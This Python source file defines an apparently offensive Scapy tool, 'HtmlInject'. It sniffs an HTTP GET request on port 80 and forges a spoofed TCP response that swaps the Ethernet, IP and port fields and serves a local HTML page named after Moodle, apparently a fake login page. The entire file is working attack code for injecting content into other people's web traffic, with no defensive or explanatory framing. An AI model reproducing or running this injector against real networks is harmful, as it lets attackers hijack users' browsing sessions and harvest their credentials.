from threading import Thread
from scapy.all import *

class HtmlInject(Thread):

    def __init__(self,p = "Html/moodle.html"):
        Thread.__init__(self)
        self.__path = p

    def run(self):
        sniff(count=1,
              filter="tcp port 80",
              lfilter=lambda p:'GET' in str(p),
              prn=self.inject)

    def inject(self,p):
        response = self.forge_response(p)
        print 'Spoofed Response: ' + str(response[IP].src) + '->' + str(response[IP].dst)
        send(response)  # send spoofed response

    def forge_response(self,p):
        ether = Ether(src=p[Ether].dst, dst=p[Ether].src)  # switch ethernet direction
        ip = IP(src=p[IP].dst, dst=p[IP].src)  # switch direction of ip address
        tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1,
                  flags="AP")  # switch direction of ports and send FIN

        page = open(self.__path, 'r')
        html = page.read()

        # create http response
        response = "HTTP /1.1 200 OK\n"
        response += "Server: MyServer\n"
        response += "Content-Type: text/html\n"
        response += "Content-Length: " + str(len(html)) + "\n"
        response += "Connection: close"
        response += "\n\n"

        response += html

        my_packet = ether / ip / tcp / response  # forge response packet with my html in it
        return my_packet

